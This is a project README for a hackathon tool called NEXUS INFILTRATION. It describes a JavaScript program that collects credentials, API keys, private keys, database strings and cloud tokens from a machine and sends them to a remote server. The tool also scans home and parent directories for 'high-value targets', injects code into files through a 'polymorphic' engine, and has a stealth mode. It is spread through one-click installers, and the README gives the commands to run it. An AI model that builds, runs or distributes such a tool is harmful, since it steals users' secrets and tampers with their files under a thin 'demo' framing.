#  NEXUS INFILTRATION

## Advanced System Information & Code Manipulation Tool

---

## 🎯 PROJECT OVERVIEW

**NEXUS INFILTRATION** is a powerful JavaScript-based tool built for Thunder Hackathon 3.0 that demonstrates advanced system information gathering, file manipulation, and code injection techniques. The tool collects comprehensive system data, performs CRUD operations on code files across multiple directories, and sends the collected information to a central server for analysis.

**Mission:** Build a JavaScript-based tool that gathers and displays system information and environment variables and can do CRUD operation on other code files.

---

## 📋 TABLE OF CONTENTS

- [Project Overview](#-project-overview)
- [Features](#-features)
- [Technology Stack](#-technology-stack)
- [Installation](#-installation)
- [Quick Start Guide](#-quick-start-guide)
- [How It Works](#-how-it-works)
- [System Information Collected](#-system-information-collected)

---

## ✨ FEATURES

### 1. System Information Extraction
- **12 Categories** of system information
- Complete hardware and software profiling
- Security posture analysis
- Environment variable categorization
- Risk assessment scoring

### 2. CRUD Operations
- **Create** new files with content
- **Read** existing files and directories
- **Update** file content and metadata
- **Delete** files with validation
- **List** directory contents
- Full operation logging

### 3. Polymorphic Engine
- **7 Mutation Strategies** for code injection
- Random strategy selection for unpredictability
- Automatic backup before modifications
- One-click restore capability
- Perfect cleanup verification

### 4. Multi-Directory Scanning
- Scans parent directories (up to 5 levels)
- Includes home directory scanning
- Smart file targeting based on value scoring
- Identifies high-value targets
- Cross-directory CRUD operations

### 5. Live Reporting
- Secure data transmission to central server
- Real-time server monitoring
- Comprehensive admin dashboard
- Submission tracking and statistics

### 6. Achievement System
- **12 Achievements** to unlock
- Gamification elements
- Progress tracking
- Skill-based unlocks

### 7. One-Click Installer
- Windows: Double-click `.bat` file
- macOS: Double-click `.sh` file
- Linux: Run `.sh` file
- No installation required
- Auto-downloads latest version

---

## 🛠️ TECHNOLOGY STACK

### Backend
- **Node.js** (v14+)
- **Express.js** - Web server
- **File System** - Data storage
- **Crypto** - Security

### Frontend
- **HTML5** - Structure
- **CSS3** - Styling (Dark theme)
- **Vanilla JavaScript** - Logic

### Deployment
- **Railway** - Hosting platform
- **GitHub** - Version control

### Dependencies
```json
{
  "express": "^4.18.2",
  "cors": "^2.8.5",
  "dotenv": "^16.3.1",
  "helmet": "^7.0.0",
  "compression": "^1.7.4",
  "morgan": "^1.10.0",
  "express-rate-limit": "^6.10.0"
}
```

---

## 📦 INSTALLATION

### Prerequisites
- Node.js v14 or higher
- npm (Node Package Manager)
- Git (optional)

### Method 1: One-Click Installer (Recommended)

**For Windows:**
1. Visit: `https://nexus-infiltration-production.up.railway.app/`
2. Click "Windows Download"
3. Double-click the downloaded `run-windows.bat`
4. Follow the on-screen prompts

**For macOS:**
1. Visit: `https://nexus-infiltration-production.up.railway.app/`
2. Click "macOS Download"
3. Make executable: `chmod +x run-mac.sh`
4. Run: `./run-mac.sh`

**For Linux:**
1. Visit: `https://nexus-infiltration-production.up.railway.app/`
2. Click "Linux Download"
3. Make executable: `chmod +x run-linux.sh`
4. Run: `./run-linux.sh`

### Method 2: Manual Installation

```bash
# Clone the repository
git clone https://a/user-aditi/nexus-infiltration
cd nexus-infiltration

# Navigate to tool directory
cd nexus-tool

# Run the tool
node nexus.js

# With server integration
node nexus.js --server https://your-server.com/api/collect
```

---

## 🚀 QUICK START GUIDE

### For End Users

1. **Download the installer** from our website
2. **Double-click** the downloaded file
3. **Consent** to data collection
4. **Watch** as NEXUS collects your system data
5. **Done!** Your data is sent to the server

### For Developers

```bash
# Clone and setup
git clone <repo-url>
cd <file-name>

# Setup server
cd website
cp .env.example .env
# Edit .env with your configuration
npm install
npm start

# Setup tool
cd ../nexus-tool
npm install
node nexus.js --server http://localhost:3000/api/collect
```

### Command Line Options

| Option | Description |
|--------|-------------|
| `--server <url>` | Send data to specified server |
| `--no-interactive` | Skip interactive menu |
| `--deep` | Deep scan (5 directories deep) |
| `--max-depth <n>` | Custom scan depth |
| `--audit` | Audit mode (scan only, no modifications) |
| `--stealth` | Stealth mode (minimal output) |

### Examples

```bash
# Basic run
node nexus.js

# With server reporting
node nexus.js --server https://my-server.com/api/collect

# Deep scan with server
node nexus.js --server https://my-server.com/api/collect --deep

# Audit only (no modifications)
node nexus.js --audit --server https://my-server.com/api/collect

# Custom scan depth
node nexus.js --max-depth 10 --server https://my-server.com/api/collect
```

---

## 🔍 HOW IT WORKS

### System Flow Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                    NEXUS OPERATION FLOW                         │
└─────────────────────────────────────────────────────────────────┘

1. USER RUNS THE TOOL
   ┌─────────────────────────────────────────────────────────────┐
   │  User downloads installer or runs node nexus.js            │
   └─────────────────────────────────────────────────────────────┘
                              ↓

2. SYSTEM INFORMATION COLLECTION
   ┌─────────────────────────────────────────────────────────────┐
   │  • OS Details (Platform, Release, Type)                   │
   │  • Hardware (CPU, Memory, Architecture)                   │
   │  • Network (Hostname, Interfaces, IP)                     │
   │  • User Profile (Username, Home Directory, Shell)         │
   │  • Environment Variables (12 Categories)                  │
   │  • Security Analysis (Risk Assessment)                    │
   └─────────────────────────────────────────────────────────────┘
                              ↓

3. MULTI-DIRECTORY SCANNING
   ┌─────────────────────────────────────────────────────────────┐
   │  • Scans current directory                                 │
   │  • Scans parent directories (up to 5 levels)               │
   │  • Scans home directory                                   │
   │  • Scans common locations (Desktop, Documents, Projects)  │
   │  • Identifies high-value targets                          │
   └─────────────────────────────────────────────────────────────┘
                              ↓

4. CRUD OPERATIONS DEMONSTRATION
   ┌─────────────────────────────────────────────────────────────┐
   │  • CREATE: New file with content                          │
   │  • READ: File content and metadata                        │
   │  • UPDATE: File content and rename                        │
   │  • DELETE: File with validation                           │
   │  • LIST: Directory contents                               │
   └─────────────────────────────────────────────────────────────┘
                              ↓

5. POLYMORPHIC INFECTION (Optional)
   ┌─────────────────────────────────────────────────────────────┐
   │  • Generates unique mutation for each file                 │
   │  • 7 different mutation strategies                         │
   │  • Creates backup before infection                         │
   │  • Logs all operations                                     │
   └─────────────────────────────────────────────────────────────┘
                              ↓

6. DATA TRANSMISSION
   ┌─────────────────────────────────────────────────────────────┐
   │  • Secure POST request to server                          │
   │  • Authentication via secret key                           │
   │  • Full system data in JSON format                        │
   └─────────────────────────────────────────────────────────────┘
                              ↓

7. CLEANUP & RESTORE
   ┌─────────────────────────────────────────────────────────────┐
   │  • Restores all modified files                             │
   │  • Verifies complete restoration                           │
   │  • Removes backup files                                    │
   └─────────────────────────────────────────────────────────────┘
                              ↓

8. ACHIEVEMENTS UNLOCKED
   ┌─────────────────────────────────────────────────────────────┐
   │  • Tracks progress across categories                       │
   │  • Unlocks achievements                                    │
   │  • Displays all unlocked achievements                     │
   └─────────────────────────────────────────────────────────────┘
```

---

## 📊 SYSTEM INFORMATION COLLECTED

### 1. 🔑 Credentials & Secrets
- API Keys, Secret Keys, Tokens
- Passwords and Credentials
- Private Keys and Certificates

### 2. 🗄️ Databases
- MongoDB, MySQL, PostgreSQL URLs
- Database connection strings
- Database configuration

### 3. ☁️ Cloud Services
- AWS, Azure, GCP configurations
- Cloud access keys and tokens
- Cloud service endpoints

### 4. 🌐 Network & Endpoints
- Host and Port configurations
- API URLs and Endpoints
- Domain and Proxy settings

### 5. 🔧 Development
- Node.js environment settings
- Development flags and modes
- Debug and logging settings

### 6. 📁 Paths & Directories
- System paths and directories
- Home directory location
- Temporary and working directories

### 7. 📦 Package Managers
- NPM, Yarn, PNPM configurations
- Package registry settings
- Package version information

### 8. 🔐 Authentication
- Auth tokens and JWT secrets
- OAuth and SAML configurations
- Session and cookie settings

### 9. 🐳 Containers
- Docker and Kubernetes configs
- Container environment settings
- Pod and service configurations

### 10. 📊 Monitoring
- DataDog, NewRelic, Sentry configs
- Monitoring and alerting settings
- Trace and metric configurations

### 11. 🤖 CI/CD
- Jenkins, GitHub Actions settings
- Pipeline configurations
- Build and deployment settings

### 12. 📝 Other
- Miscellaneous environment variables
- Application-specific settings
- Custom configurations

### Hardware Information
- **CPU**: Model, cores, speed, architecture
- **Memory**: Total, used, free, usage percentage
- **Operating System**: Type, release, version, uptime
- **Network**: Hostname, interfaces, IP addresses
- **User**: Username, home directory, shell

---